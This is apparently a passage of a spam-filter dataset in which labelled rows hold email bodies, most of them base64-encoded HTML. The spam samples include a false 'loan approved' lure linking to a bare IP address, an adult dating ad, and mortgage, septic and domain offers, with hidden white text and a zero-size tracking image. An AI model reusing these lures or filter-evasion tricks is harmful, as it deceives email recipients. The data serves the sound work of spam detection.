pnCms6W0wlq90KijvcyhQaSjt1GmQaasqOymuatIvdCr9iZuYnNwOyAgICAgDQotJmd0OyZuYnNw OyAoPGEgaHJlZj0iaHR0cDovL3gtbWFpbC5oOGguY29tLnR3IiB0YXJnZXQ9Il9ibGFuayI+qdqm rLxzp2k8L2E+KTwvZm9udD48L3A+ICAgDQoNCjwvYm9keT4NCg0KPC9odG1sPg==,
1,PGh0bWw+DQo8Ym9keT4NCjxmb250IGNvbG9yPSJmZmZmZmYiPm1hcnRpbmV6 PC9mb250Pg0KPHA+WW91ciBob21lIHJlZmluYW5jZSBsb2FuIGlzIGFwcHJv dmVkITxicj48L3A+PGJyPg0KPHA+VG8gZ2V0IHlvdXIgYXBwcm92ZWQgYW1v dW50IDxhIGhyZWY9Imh0dHA6Ly8yMDAuMzIuMy4xMjEvaW5kZXguaHRtIj5n bw0KaGVyZTwvYT4uPC9wPg0KPGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJy Pjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+ PGJyPg0KPHA+VG8gYmUgZXhjbHVkZWQgZnJvbSBmdXJ0aGVyIG5vdGljZXMg PGEgaHJlZj0iaHR0cDovLzIwMC4zMi4zLjEyMS9yZW1vdmUuaHRtbCI+Z28N CmhlcmU8L2E+LjwvcD4NCjxmb250IGNvbG9yPSJmZmZmZmYiPm1hcnRpbmV6 PC9mb250Pg0KPC9ib2R5Pg0KPGZvbnQgY29sb3I9ImZmZmZmZiI+MWdhdGUN CjwvaHRtbD4NCjA0NTRZdlFEOC00NjdCWllDMjYyMHhIemc2LTk2bDI3,
1,<html><body><IMG SRC='http://master2.free4all.com/cgi-bin/sp/t.pl?id=7:56446664&o=1&d=1' BORDER=0 WIDTH=0 HEIGHT=0/> <center><img src=http://www.vitafactory.com/ad-friday/test.gif border=0> </body></html>,
1,SWYgeW91ciBob21lIGlzIHNlcnZlZCBieSBhIHNlcHRpYyBzeXN0ZW0sIHlv dSB3aWxsIGJlIGFibGUgdG8gcmVjZWl2ZQ0KaW52YWx1YWJsZSBpbmZvcm1h dGlvbiBvbiBob3cgdG8gZWxpbWluYXRlIHB1bXAgb3V0cywgbWFpbnRhaW4g dGhlDQpzeXN0ZW0gcHJvcGVybHkgYW5kIGN1cmUgcHJvYmxlbXMgc3VjaCBh cyBiYWNrdXBzLCB3ZXQgc3BvdHMsIG9kb3IsIGV0Yy4NCg0KWW91IGNhbiBk byB0aGlzIGJ5IGNoZWNraW5nIG91dCBvdXIgU1BDIHByb2dyYW0gYXQ6DQoN Cmh0dHA6Ly93d3cuYmxhY2tzbm93Y2xvdWQuY29tDQoNCkluIGFkZGl0aW9u LCB5b3Ugd2lsbCBoYXZlIHRoZSBvcHBvcnR1bml0eSB0byBwYXJ0aWNpcGF0 ZSBpbiBhIGZyZWUNCnRyaWFsIHRvIHRlc3QgdGhlIGVmZmVjdGl2ZW5lc3Mg b2YgU1BDLg0KDQpQbGVhc2UgY2hlY2sgdXMgb3V0Lg0KDQpUaGFuayB5b3Uu DQoNClNpbmNlcmVseSwNCg0KU1BDDQoNClAuUy4gUmVtZW1iZXIsIHlvdSBt dXN0IGNsaWNrIG9uIHRoaXMgbGluayB0byByZWNlaXZlIHRoaXMgaGVscGZ1 bA0KaW5mb3JtYXRpb24hDQoNCmh0dHA6Ly93d3cuYmxhY2tzbm93Y2xvdWQu Y29tDQoNCg0KDQpUbyBiZSByZW1vdmVkIGZyb20gb3VyIGVtYWlsIGxpc3Qg cGxlYXNlIGNsaWNrIG9uIHRoZSBsaW5rIGJlbG93Lg0KaHR0cDovL3d3dy5i bGFja3Nub3djbG91ZC5jb20vcmVtb3ZlLmh0bWwNCg0KNzEyM3JLUko5LTI4 NHpvV1Q5MzIyT1FKcDktMTg3TUNXbzg4NzhWWmxKNy0zNzl5bDQ1DQo=,
1,PEhUTUw+DQo8SEVBRD4NCiAgIA0KICAgPFRJVExFPk1hcnJpZWQgQnV0IExv bmVseTwvVElUTEU+DQo8L0hFQUQ+DQo8Qk9EWSBCR0NPTE9SPSIjRkZGRkZG IiBMSU5LPSIjRkYwMDAwIiBWTElOSz0iI0ZGMDAwMCIgQUxJTks9IiNGRjAw MDAiPg0KDQo8UCBBTElHTj0iY2VudGVyIj4gPElNRyBCT1JERVI9IjAiIFNS Qz0iaHR0cDovL3d3dy5wYWdlNGxpZmUub3JnL3VzZXJzL3h4eGRhdGluZy9t YXJyaWVkYW5kbG9uZWx5L2ltYWdlcy9sb2dvLmpwZyIgV0lEVEg9IjUwMCIg SEVJR0hUPSIxOTEiPiZuYnNwOyAmbmJzcDsgPC9QPg0KPENFTlRFUj4NCiAg PFRBQkxFIENFTExTUEFDSU5HPTUgQ0VMTFBBRERJTkc9NSBCR0NPTE9SPSIj NjY2Njk5IiA+DQogICAgPFRSPg0KPFREPjxJTUcgU1JDPSJodHRwOi8vd3d3 LnBhZ2U0bGlmZS5vcmcvdXNlcnMveHh4ZGF0aW5nL21hcnJpZWRhbmRsb25l bHkvcDcwNi5qcGciIEJPUkRFUj0wIEhFSUdIVD0xODAgV0lEVEg9MTIwPjwv VEQ+DQoNCjxURD48SU1HIFNSQz0iaHR0cDovL3d3dy5wYWdlNGxpZmUub3Jn L3VzZXJzL3h4eGRhdGluZy9tYXJyaWVkYW5kbG9uZWx5L3A3MDQuanBnIiBC T1JERVI9MCBIRUlHSFQ9MTgwIFdJRFRIPTEyMD48L1REPg0KDQo8VEQ+PElN RyBTUkM9Imh0dHA6Ly93d3cucGFnZTRsaWZlLm9yZy91c2Vycy94eHhkYXRp bmcvbWFycmllZGFuZGxvbmVseS9wNzA1LmpwZyIgQk9SREVSPTAgSEVJR0hU PTE4MCBXSURUSD0xMjA+PC9URD4NCg0KPFREPjxJTUcgU1JDPSJodHRwOi8v d3d3LnBhZ2U0bGlmZS5vcmcvdXNlcnMveHh4ZGF0aW5nL21hcnJpZWRhbmRs b25lbHkvcDExOTliLmdpZiIgQk9SREVSPTAgSEVJR0hUPTE4MCBXSURUSD0x MjA+PC9URD4NCjwvVFI+DQo8L1RBQkxFPjwvQ0VOVEVSPg0KDQo8QlI+Jm5i c3A7DQo8Q0VOVEVSPjxUQUJMRSBDT0xTPTEgV0lEVEg9IjUwMCIgSEVJR0hU PSI2MDAiID4NCjxUUj4NCjxURD48Rk9OVCBDT0xPUj0iI0ZGNjY2NiI+PEEg SFJFRj0iaHR0cDovL3d3dy5wYWdlNGxpZmUub3JnL3VzZXJzL3h4eGRhdGlu Zy9tYXJyaWVkYW5kbG9uZWx5L3ByZXZpZXcuaHRtIj5FTlRFUg0KVEhFIFdP UkxEIEZBTU9VUzwvQT4gPC9GT05UPjxGT05UIFNJWkU9IjYiIENPTE9SPSIj RkYwMEZGIj5NYXJyaWVkIEJ1dCBMb25lbHk8L0ZPTlQ+PEI+PEk+PEZPTlQg Q09MT1I9IiNGRjAwRkYiIFNJWkU9IjUiPiE8L0ZPTlQ+PC9JPjwvQj48Rk9O VCBDT0xPUj0iI0ZGMDBGRiI+DQo8L0ZPTlQ+DQo8VUw+DQo8TEk+DQpBIHdv cmxkd2lkZSBub24tcHJvZml0IG9yZ2FuaXphdGlvbiBmb3VuZGVkIGFuZCBt YW5hZ2VkIGV4Y2x1c2l2ZWx5IGJ5DQp3b21lbjwvTEk+DQoNCjxMST4NCkZl YXR1cmluZyBvbmx5IFJFQUwgYXR0YWNoZWQgd29tZW4gaW4gc2VhcmNoIG9m IFJFQUwgU2V4IE9uIFRoZSBTaWRlIG5hdGlvbndpZGUNCmFuZCBpbiAyMCBj b3VudHJpZXM8L0xJPg0KDQo8TEk+DQpCYXNlZCBpbiBMb3MgQW5nZWxlcywg Q2FsaWZvcm5pYTogVGhlIFdvcmxkIENhcGl0YWwgZm9yIFNleCBPbiBUaGUg U2lkZSZuYnNwOzwvTEk+DQo8L1VMPg0KPEZPTlQgQ09MT1I9IiNGRjAwMDAi PkZBQ1Q6PC9GT05UPg0KPFVMPg0KPExJPg0KT3ZlciAyNyBNaWxsaW9uIHZp c2l0b3JzIGluIGxlc3MgdGhhbiAyIHllYXJzIHdpdGhvdXQgYW55IGNvbW1l cmNpYWwgYWR2ZXJ0aXNpbmcNCm1lYW5zLiAiVGhlIHdvcmQgc3ByZWFkcyBm YXN0Ii48L0xJPg0KPC9VTD4NCiZuYnNwOzxGT05UIENPTE9SPSIjRkYwMDAw Ij5MRUdBTCBOT1RJQ0U8L0ZPTlQ+DQo8VUw+DQo8TEk+DQpUaGlzIHNpdGUg Y29udGFpbnMgYWR1bHQgb3JpZW50ZWQgbWF0ZXJpYWwuIElmIHlvdSBmaW5k IHRoaXMgbWF0ZXJpYWwgdG8NCmJlIG9mZmVuc2l2ZSBvciBhcmUgdW5kZXIg dGhlIGFnZSBvZiAxOCB5ZWFycyAob3IgMjEgeWVhcnMgZGVwZW5kaW5nIG9u DQpsb2NhbCBsYXdzKSwgb3IgaXQgaXMgaWxsZWdhbCB3aGVyZSB5b3UgYXJl LCB0aGVuIHlvdSBtdXN0IExFQVZFIHRoaXMgc2l0ZQ0KTk9XISZuYnNwOzwv TEk+DQoNCjxMST4NCkJ5IGVudGVyaW5nIHRoaXMgc2l0ZSB5b3UgZGVjbGFy ZSB1bmRlciBwZW5hbHR5IG9mIHBlcmp1cnkgdGhhdCB5b3UgYXJlDQphYm92 ZSB0aGUgYWdlIGxpbWl0IGFuZCBkbyBub3QgZmluZCB0aGlzIG1hdGVyaWFs IG9mZmVuc2l2ZS4gWW91IHdpbGwgYWxzbw0Kbm90IGhvbGQgdXMgbGlhYmxl IGZvciBhbnkgZGFtYWdlcyBvciBwZXJzb25hbCBkaXNjb21mb3J0LiZuYnNw OzwvTEk+DQoNCjxMST4NCkkgYW0gYW4gYWR1bHQgb3ZlciB0aGUgYWdlIG9m IDE4IHllYXJzIChvciAyMSB5ZWFycyBkZXBlbmRpbmcgb24gbG9jYWwNCmdv dmVybmluZyBsYXdzIHJlbGF0aW5nIHRvIGV4cGxpY2l0IHNleHVhbCBtYXRl cmlhbCkuPC9MST4NCg0KPExJPg0KSSB3aWxsIG5vdCBhbGxvdyBhbnlvbmUg dW5kZXIgdGhlIGxlZ2FsIGFnZSB3aGljaCBpcyBkZXRlcm1pbmVkIGFzIGFi b3ZlDQp0byBoYXZlIGFjY2VzcyB0byBhbnkgb2YgdGhlIG1hdGVyaWFscyBj b250YWluZWQgd2l0aGluIHRoaXMgc2l0ZS48L0xJPg0KDQo8TEk+DQpJIGFt IHZvbHVudGFyaWx5IGNvbnRpbnVpbmcgb24gd2l0aCB0aGlzIHNpdGUsIEkg dW5kZXJzdGFuZCBJIHdpbGwgYmUgZXhwb3NlZA0KdG8gc2V4dWFsbHkgZXhw bGljaXQgbWF0ZXJpYWwgaW5jbHVkaW5nIHBpY3R1cmVzLCBzdG9yaWVzICwg dmlkZW9zIGFuZA0KZ3JhcGhpY3MuPC9MST4NCg0KPExJPg0KSSB3aWxsIG5v dCBob2xkIHlvdSByZXNwb25zaWJsZSBmb3IgYW55IGRhbWFnZXMgb3Igdmlv bGF0aW9ucyB0aGF0IHlvdQ0KbWF5IGhhdmUgY2F1c2VkLjwvTEk+DQo8L1VM Pg0KDQo8Q0VOVEVSPg0KPFA+PEJSPjxCPjxGT05UIFNJWkU9Nz48QSBIUkVG PSJodHRwOi8vd3d3LnBhZ2U0bGlmZS5vcmcvdXNlcnMveHh4ZGF0aW5nL21h cnJpZWRhbmRsb25lbHkvcHJldmlldy5odG0iPkVOVEVSDQpTSVRFPC9BPjwv Rk9OVD48L0I+PC9DRU5URVI+DQo8L1REPg0KPC9UUj4NCjwvVEFCTEU+PC9D RU5URVI+DQoNCjxQIEFMSUdOPSJjZW50ZXIiPiZuYnNwOzwvUD4NCg0KPC9C T0RZPg0KPC9IVE1MPg0KODIxNmpSRVg5LTc4NXZGako1N2wxOA==,
1,eyVSQU5EfQ0KUFVCTElDIEFOTk9VTkNFTUVOVDoNCg0KVGhlIG5ldyBkb21h aW4gbmFtZXMgYXJlIGZpbmFsbHkgYXZhaWxhYmxlIHRvIHRoZSBnZW5lcmFs IHB1YmxpYyBhdCBkaXNjb3VudCBwcmljZXMuIE5vdyB5b3UgY2FuIHJlZ2lz dGVyIG9uZSBvZiB0aGUgZXhjaXRpbmcgbmV3IC5CSVogb3IgLklORk8gZG9t YWluIG5hbWVzLCBhcyB3ZWxsIGFzIHRoZSBvcmlnaW5hbCAuQ09NIGFuZCAu TkVUIG5hbWVzIGZvciBqdXN0ICQxNC45NS4gVGhlc2UgYnJhbmQgbmV3IGRv bWFpbiBleHRlbnNpb25zIHdlcmUgcmVjZW50bHkgYXBwcm92ZWQgYnkgSUNB Tk4gYW5kIGhhdmUgdGhlIHNhbWUgcmlnaHRzIGFzIHRoZSBvcmlnaW5hbCAu Q09NIGFuZCAuTkVUIGRvbWFpbiBuYW1lcy4gVGhlIGJpZ2dlc3QgYmVuZWZp dCBpcyBvZi1jb3Vyc2UgdGhhdCB0aGUgLkJJWiBhbmQgLklORk8gZG9tYWlu IG5hbWVzIGFyZSBjdXJyZW50bHkgbW9yZSBhdmFpbGFibGUuIGkuZS4gaXQg d2lsbCBiZSBtdWNoIGVhc2llciB0byByZWdpc3RlciBhbiBhdHRyYWN0aXZl IGFuZCBlYXN5LXRvLXJlbWVtYmVyIGRvbWFpbiBuYW1lIGZvciB0aGUgc2Ft ZSBwcmljZS4gIFZpc2l0OiBodHRwOi8vd3d3LmFmZm9yZGFibGUtZG9tYWlu cy5jb20gdG9kYXkgZm9yIG1vcmUgaW5mby4NCiANClJlZ2lzdGVyIHlvdXIg ZG9tYWluIG5hbWUgdG9kYXkgZm9yIGp1c3QgJDE0Ljk1IGF0OiBodHRwOi8v d3d3LmFmZm9yZGFibGUtZG9tYWlucy5jb20vICBSZWdpc3RyYXRpb24gZmVl cyBpbmNsdWRlIGZ1bGwgYWNjZXNzIHRvIGFuIGVhc3ktdG8tdXNlIGNvbnRy b2wgcGFuZWwgdG8gbWFuYWdlIHlvdXIgZG9tYWluIG5hbWUgaW4gdGhlIGZ1 dHVyZS4NCiANClNpbmNlcmVseSwNCiANCkRvbWFpbiBBZG1pbmlzdHJhdG9y DQpBZmZvcmRhYmxlIERvbWFpbnMNCg0KDQpUbyByZW1vdmUgeW91ciBlbWFp bCBhZGRyZXNzIGZyb20gZnVydGhlciBwcm9tb3Rpb25hbCBtYWlsaW5ncyBm cm9tIHRoaXMgY29tcGFueSwgY2xpY2sgaGVyZToNCmh0dHA6Ly93d3cuY2Vu dHJhbHJlbW92YWxzZXJ2aWNlLmNvbS9jZ2ktYmluL2RvbWFpbi1yZW1vdmUu Y2dpDQozMQ0KDQoNCg0KDQoNCg0KDQoNClswOTg0b0lhUzctMjM2bUV3QDE1 XQ0K,
1,PHRhYmxlIHdpZHRoPSI3MTUiPg0KICA8dHI+DQogICAgPHRkIHZBbGlnbj0i dG9wIiBhbGlnbj0ibGVmdCIgd2lkdGg9IjUxMSI+DQogICAgICA8Zm9udCBj b2xvcj0iI0ZGRkZGRiI+d3lvbWluZzwvZm9udD4NCiAgICAgIDxibG9ja3F1 b3RlPg0KICAgICAgICA8Zm9udCBjb2xvcj0ibmF2eSIgc2l6ZT0iNCI+PGZv bnQgZmFjZT0iYXJpYWwiIGNvbG9yPSJyZWQiIHNpemU9IjMiPjxiPjxpPiZx dW90O05vdw0KICAgICAgICBpcyB0aGUgdGltZSB0byB0YWtlIGFkdmFudGFn ZSBvZiBmYWxsaW5nIGludGVyZXN0IHJhdGVzISBUaGVyZSBpcyBubw0KICAg ICAgICBhZHZhbnRhZ2UgaW4gd2FpdGluZyBhbnkgbG9uZ2VyLiZxdW90Ozwv aT48L2I+PGJyPg0KICAgICAgICA8YnI+DQogICAgICAgIDwvZm9udD48Zm9u dCBzaXplPSIzIj5SZWZpbmFuY2Ugb3IgY29uc29saWRhdGUgaGlnaCBpbnRl cmVzdCBjcmVkaXQgY2FyZA0KICAgICAgICBkZWJ0IGludG8gYSBsb3cgaW50 ZXJlc3QgbW9ydGdhZ2UuIE1vcnRnYWdlIGludGVyZXN0IGlzIHRheCBkZWR1 Y3RpYmxlLA0KICAgICAgICB3aGVyZWFzIGNyZWRpdCBjYXJkIGludGVyZXN0 IGlzIG5vdC48YnI+DQogICAgICAgIDxicj4NCiAgICAgICAgWW91IGNhbiBz YXZlIHRob3VzYW5kcyBvZiBkb2xsYXJzIG92ZXIgdGhlIGNvdXJzZSBvZiB5 b3VyIGxvYW4gd2l0aCBqdXN0DQogICAgICAgIGEgMC4yNSUgZHJvcCBpbiB5 b3VyIHJhdGUhPGJyPg0KICAgICAgICA8YnI+DQogICAgICAgIE91ciBuYXRp b253aWRlIG5ldHdvcmsgb2YgbGVuZGVycyBoYXZlIGh1bmRyZWRzIG9mIGRp ZmZlcmVudCBsb2FuDQogICAgICAgIHByb2dyYW1zIHRvIGZpdCB5b3VyIGN1 cnJlbnQgc2l0dWF0aW9uOg0KICAgICAgICA8YmxvY2txdW90ZT4NCiAgICAg ICAgICA8Zm9udCBjb2xvcj0icmVkIj48Yj4NCiAgICAgICAgICA8dWw+DQog ICAgICAgICAgICA8bGk+UmVmaW5hbmNlDQogICAgICAgICAgICA8bGk+U2Vj b25kIE1vcnRnYWdlDQogICAgICAgICAgICA8bGk+RGVidCBDb25zb2xpZGF0 aW9uDQogICAgICAgICAgICA8bGk+SG9tZSBJbXByb3ZlbWVudA0KICAgICAg ICAgICAgPGxpPlB1cmNoYXNlPC9saT4NCiAgICAgICAgICA8L3VsPg0KICAg ICAgICAgIDwvYj4NCiAgICAgICAgICA8L2Jsb2NrcXVvdGU+DQogICAgICAg IDwvZm9udD4NCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+PGZvbnQgc2l6 ZT0iNCI+TGV0DQogICAgICAgIHVzIGRvIHRoZSBzaG9wcGluZyBmb3IgeW91 Li4uPGEgaHJlZj0iaHR0cDovLzIxMS45MS4yMC4xNjMvaG9zdC9Zb3VyQXBw cm92ZWQvIiB0YXJnZXQ9Il9ibGFuayI+SVQgSVMgRlJFRSE8YnI+DQogICAg ICAgIENMSUNLIEhFUkUmcXVvdDs8L2E+PC9mb250PjwvcD4NCiAgICAgICAg PHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7PC9wPg0KICAgICAgICA8cCBhbGln bj0iY2VudGVyIj4mbmJzcDs8L3A+DQogICAgICAgIDxwIGFsaWduPSJjZW50 ZXIiPiZuYnNwOzwvcD4NCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+Jm5i c3A7PC9wPjwvZm9udD48L2ZvbnQ+PHAgYWxpZ249ImNlbnRlciI+PGZvbnQg c2l6ZT0iNCIgY29sb3I9IiMwMDAwODAiPlRvDQogICAgICBiZSByZW1vdmVk IGZyb20gb3VyIG1haWxpbmcgbGlzdCA8YSBocmVmPSJodHRwOi8vMjExLjkx LjIwLjE2My9ob3N0L3JlbW92ZS8iPkNsaWNrDQogICAgICBIZXJlPC9hPjwv Zm9udD48L3A+DQogICAgICAgIDxmb250IGNvbG9yPSJuYXZ5IiBzaXplPSI0 Ij48Zm9udCBzaXplPSIzIj4NCiAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+ Jm5ic3A7PC9wPg0KMzY0Mm1jcEM1LTg4ME53cUs4MDA2VGJ6VDctOTk4Ynda dzU4NzVBeUNMMi0wNTdZTEtTODgwM25kT0s3LTQ3N0RsVGkxOTE4bm1sNzA=,
0,http://www.post-gazette.com/columnists/20020905brian5.asp,
